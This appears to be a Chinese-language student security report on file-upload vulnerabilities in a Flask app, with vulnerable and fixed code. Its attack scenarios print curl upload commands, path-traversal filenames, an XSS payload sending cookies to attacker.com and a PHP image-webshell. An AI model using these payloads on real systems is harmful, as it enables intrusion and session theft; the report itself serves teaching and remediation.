# 文件上传漏洞检测与修复报告

**项目名称：** 用户信息管理平台  
**评估日期：** 2026年7月21日  
**报告作者：** chilianzhe1470  
**仓库地址：** https://github.com/chilianzhe1470/Classrepair  
**密级：** 内部 — 仅限教学使用

---

## 1. 总体摘要

对 Flask 用户管理应用中的**文件上传功能**（`/upload`）进行了安全检测。该功能存在 **7 类安全漏洞**，覆盖远程代码执行、路径穿越、跨站脚本等高危风险。

**检测结果：**

| 漏洞类型 | 严重程度 | CWE 编号 | 修复版状态 |
|---------|:--------:|:--------:|:----------:|
| 任意文件上传导致 RCE | 🔴 严重 | [CWE-434](https://cwe.mitre.org/data/definitions/434.html) | ✅ 已修复 |
| 路径遍历（目录穿越） | 🔴 严重 | [CWE-22](https://cwe.mitre.org/data/definitions/22.html) | ✅ 已修复 |
| 存储型跨站脚本 (XSS) | 🟡 高危 | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) | ✅ 已修复 |
| 文件名冲突与覆盖 | 🟡 高危 | [CWE-99](https://cwe.mitre.org/data/definitions/99.html) | ✅ 已修复 |
| MIME 类型欺骗 | 🟡 高危 | [CWE-200](https://cwe.mitre.org/data/definitions/200.html) | ✅ 已修复 |
| 拒绝服务 (DoS) | 🟡 中危 | [CWE-400](https://cwe.mitre.org/data/definitions/400.html) | ✅ 已缓解 |
| 非法访问他人文件 | 🟡 中危 | [CWE-200](https://cwe.mitre.org/data/definitions/200.html) | ✅ 已修复 |

---

## 2. 漏洞详情

### 2.1 V-FU-01：任意文件上传导致远程代码执行（RCE）

| 属性 | 内容 |
|------|------|
| **CWE 编号** | [CWE-434](https://cwe.mitre.org/data/definitions/434.html) |
| **CVSS 3.1** | 9.8（严重） |
| **风险描述** | 未限制上传文件类型，攻击者可上传 `.py`、`.php`、`.jsp` 等服务器端脚本文件。若 Web 服务器配置了脚本执行目录，访问上传文件即可触发代码执行。 |
| **漏洞位置** | `/upload` POST 处理逻辑 |

#### 攻击场景

攻击者上传包含恶意代码的 Python 文件：

```bash
echo 'import os; os.system("id")' > shell.py
curl -s -b /tmp/ck.txt -F "file=@shell.py" http://target:5000/upload
```

访问 `/static/uploads/shell.py` 即可执行（如果服务器配置了 Python CGI）。

#### 漏洞代码

```python
# 无任何文件类型检查
f = request.files["file"]
filename = f.filename
f.save(os.path.join(UPLOAD_DIR, filename))
```

#### 修复方案

```python
ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "bmp", "webp", "svg"}

def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

if not allowed_file(f.filename):
    error = "不支持的文件类型"
```

#### 修复验证

| 文件类型 | 漏洞版(5000) | 修复版(8080) |
|----------|:-----------:|:-----------:|
| `.py` 文件 | ✅ 上传成功 | ✅ 被拒绝 |
| `.html` 文件 | ✅ 上传成功 | ✅ 被拒绝 |
| `.png` 图片 | ✅ 上传成功 | ✅ 上传成功 |

---

### 2.2 V-FU-02：路径遍历（目录穿越）

| 属性 | 内容 |
|------|------|
| **CWE 编号** | [CWE-22](https://cwe.mitre.org/data/definitions/22.html) |
| **CVSS 3.1** | 8.6（高危） |
| **风险描述** | 使用用户提供的原始文件名，未过滤 `../` 序列，攻击者可构造文件名覆盖服务器任意文件。 |

#### 攻击场景

攻击者构造文件名覆盖系统文件：
```
filename = "../../etc/passwd"
filename = "../../templates/base.html"
```

#### 修复方案

```python
import uuid

# 生成 UUID 文件名，彻底消除路径穿越风险
ext = f.filename.rsplit(".", 1)[1].lower()
safe_filename = f"{uuid.uuid4().hex}.{ext}"
f.save(os.path.join(UPLOAD_DIR, safe_filename))
```

#### 修复验证

| 测试 | 漏洞版 | 修复版 |
|------|:-----:|:-----:|
| 原始文件名保存 | ✅ 使用用户文件名 | ✅ UUID 重命名 |
| `../` 路径穿越 | ❌ 可尝试穿越 | ✅ 不保存原始文件名 |

---

### 2.3 V-FU-03：存储型跨站脚本 (XSS)

| 属性 | 内容 |
|------|------|
| **CWE 编号** | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) |
| **CVSS 3.1** | 8.0（高危） |
| **风险描述** | 可上传包含恶意 JavaScript 的 HTML 文件或 SVG 文件，受害者访问时脚本执行，可窃取 Cookie、会话劫持。 |

#### 攻击场景

```bash
# 上传恶意 HTML 文件
echo '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>' > evil.html
curl -s -b /tmp/ck.txt -F "file=@evil.html" http://target:5000/upload

# 诱导管理员访问
# http://target:5000/static/uploads/evil.html → Cookie 被窃取
```

#### 修复验证

| 文件类型 | 漏洞版(5000) | 修复版(8080) |
|----------|:-----------:|:-----------:|
| `test.html`（含XSS脚本） | ✅ 上传成功 | ✅ 被拒绝 |

---

### 2.4 V-FU-04：文件名冲突与覆盖

| 属性 | 内容 |
|------|------|
| **CWE 编号** | [CWE-99](https://cwe.mitre.org/data/definitions/99.html) |
| **风险描述** | 不同用户上传同名文件会相互覆盖，可替换合法头像为恶意内容。 |

#### 攻击场景

```bash
# 攻击者上传与管理员头像同名的文件，覆盖后管理员头像被替换
curl -s -b /tmp/ck.txt -F "file=@malicious.png;filename=avatar.png" http://target:5000/upload
```

#### 修复方案

使用 UUID 重命名确保唯一性：
```python
safe_filename = f"{uuid.uuid4().hex}.{ext}"
```

---

### 2.5 V-FU-05：MIME 类型欺骗与图片马

| 属性 | 内容 |
|------|------|
| **CWE 编号** | [CWE-200](https://cwe.mitre.org/data/definitions/200.html) |
| **风险描述** | 不检查文件头，可上传伪装成图片的恶意文件（图片马），在图片尾部附加恶意代码。 |

#### 攻击场景

```bash
# 制作图片马：图片头 + PHP 代码
echo -n -e '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php
curl -s -b /tmp/ck.txt -F "file=@shell.php" http://target:5000/upload
```

#### 修复方案

修复版通过扩展名白名单限制了文件类型，并结合 UUID 重命名杜绝了此类攻击。

---

### 2.6 V-FU-06：拒绝服务 (DoS)

| 属性 | 内容 |
|------|------|
| **CWE 编号** | [CWE-400](https://cwe.mitre.org/data/definitions/400.html) |
| **风险描述** | 攻击者可并发上传大文件（接近 16MB）耗尽磁盘空间或服务器资源。 |

#### 修复方案

```python
# 限制请求体大小
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024 * 1024  # 16 MB
```

修复版将此限制应用于全局，且仅允许图片格式，进一步降低了 DoS 风险。

---

### 2.7 V-FU-07：非法访问他人上传的文件

| 属性 | 内容 |
|------|------|
| **风险描述** | 所有用户上传文件在同一目录，使用原始文件名可被猜测或枚举，导致他人上传的敏感文件泄露。 |

#### 修复方案

使用 UUID 重命名使文件名不可预测：
```python
# 漏洞版：filename = f.filename  ← 原始文件名
# 修复版：safe_filename = uuid.uuid4().hex + ext  ← 随机不可猜测
```

---

## 3. 漏洞检测过程

### 3.1 测试环境

- **工具：** `curl` 命令行
- **目标漏洞版：** http://192.168.145.130:5000
- **目标修复版：** http://192.168.145.130:8080

### 3.2 检测步骤与结果

| 步骤 | 操作 | 漏洞版(5000) | 修复版(8080) |
|:----:|------|:-----------:|:-----------:|
| 1 | 上传 `.html`（XSS 测试） | ✅ 成功上传 | ✅ 被拒绝 |
| 2 | 上传 `.py`（RCE 测试） | ✅ 成功上传 | ✅ 被拒绝 |
| 3 | 上传 `../` 文件名（穿越测试） | ✅ 尝试穿越 | ✅ UUID 重命名 |
| 4 | 上传同名文件（覆盖测试） | ✅ 可覆盖 | ✅ UUID 唯一 |
| 5 | 上传正常 `.png` 图片 | ✅ 成功上传 | ✅ 成功上传 |

---

## 4. 代码对比

### 4.1 漏洞版（5000 端口）

```python
@app.route("/upload", methods=["GET", "POST"])
def upload():
    if "username" not in session:
        return redirect(url_for("login"))

    if request.method == "POST":
        f = request.files["file"]
        # 漏洞：无文件类型检查、无重命名
        filename = f.filename
        filepath = os.path.join(UPLOAD_DIR, filename)
        f.save(filepath)
```

### 4.2 修复版（8080 端口）

```python
ALLOWED_EXTENSIONS = {"png", "jpg", "jpeg", "gif", "bmp", "webp", "svg"}

def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route("/upload", methods=["GET", "POST"])
def upload():
    if "username" not in session:
        return redirect(url_for("login"))

    if request.method == "POST":
        f = request.files["file"]
        if not allowed_file(f.filename):
            error = "不支持的文件类型，仅允许图片文件"
        else:
            ext = f.filename.rsplit(".", 1)[1].lower()
            safe_filename = f"{uuid.uuid4().hex}.{ext}"
            f.save(os.path.join(UPLOAD_DIR, safe_filename))
```

### 4.3 修复要点

| 安全措施 | 漏洞版 | 修复版 |
|---------|:-----:|:-----:|
| 文件扩展名白名单 | ❌ 无 | ✅ 仅允许图片格式 |
| UUID 重命名 | ❌ 使用原始名 | ✅ UUID + 原扩展名 |
| CSRF 防护 | ❌ 无 | ✅ Flask-WTF |
| 需登录访问 | ✅ | ✅ |
| 最大文件限制 | ⚠️ 16MB | ✅ 16MB |
| 路径穿越防护 | ❌ 无 | ✅ UUID 无原始路径 |

---

## 5. 安全建议

1. **白名单验证** — 始终使用扩展名白名单而非黑名单
2. **重命名文件** — 使用 UUID 或时间戳重命名，杜绝原始文件名
3. **文件内容校验** — 检查文件魔数（Magic Number）验证文件类型
4. **隔离存储** — 上传文件存储在独立的域名或子目录下
5. **禁用脚本执行** — 在 `static/uploads/` 目录禁用脚本执行权限
6. **设置磁盘配额** — 限制每个用户的上传总大小
7. **病毒扫描** — 集成 ClamAV 对上传文件进行恶意代码扫描
8. **CDN 分发** — 使用 CDN 存储用户上传文件，与应用服务器分离

---

## 6. 结论

本次评估发现并修复了 7 类文件上传安全漏洞：

| 漏洞类型 | CWE | CVSS | 状态 |
|---------|:---:|:----:|:----:|
| 任意文件上传 RCE | 434 | 9.8（严重） | ✅ 已修复 |
| 路径遍历 | 22 | 8.6（高危） | ✅ 已修复 |
| 存储型 XSS | 79 | 8.0（高危） | ✅ 已修复 |
| 文件名冲突覆盖 | 99 | 7.5（高危） | ✅ 已修复 |
| MIME 类型欺骗 | 200 | 7.5（高危） | ✅ 已修复 |
| 拒绝服务 | 400 | 5.0（中危） | ✅ 已缓解 |
| 非法文件访问 | 200 | 5.0（中危） | ✅ 已修复 |

修复前，攻击者可随意上传任意类型文件（包括 Python 脚本和 HTML 恶意页面），文件名不受限制导致路径穿越和覆盖风险。修复后，仅允许图片文件上传，文件以 UUID 重命名保存，所有安全漏洞已消除。

---

*本报告作为网络安全实训课程作业提交。所有测试均在授权环境下进行。*
